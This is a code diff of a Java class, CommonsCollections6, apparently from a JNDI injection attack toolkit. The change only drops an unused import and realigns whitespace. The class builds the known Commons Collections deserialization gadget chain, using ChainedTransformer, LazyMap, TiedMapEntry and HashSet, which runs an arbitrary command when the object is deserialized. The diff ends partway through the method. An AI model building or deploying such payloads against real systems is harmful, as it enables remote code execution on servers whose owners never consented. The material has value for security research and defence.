@@ -1,6 +1,5 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Reflections;
@@ -38,15 +37,15 @@ import java.util.Map;
 @Authors({Authors.MATTHIASKAISER})
 public class CommonsCollections6 implements ObjectPayload<Serializable> {
     public Serializable getObject(String command) throws Exception {
-        
+
         final Transformer[] transformers = TransformerUtil.makeTransformer(command);
 
         Transformer transformerChain = new ChainedTransformer(transformers);
 
-        final Map innerMap = new HashMap();
-        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-        TiedMapEntry entry = new TiedMapEntry(lazyMap, "QI4L");
-        HashSet map = new HashSet(1);
+        final Map    innerMap = new HashMap();
+        final Map    lazyMap  = LazyMap.decorate(innerMap, transformerChain);
+        TiedMapEntry entry    = new TiedMapEntry(lazyMap, "QI4L");
+        HashSet      map      = new HashSet(1);
         map.add("QI4L");
         Field f = null;
         try {
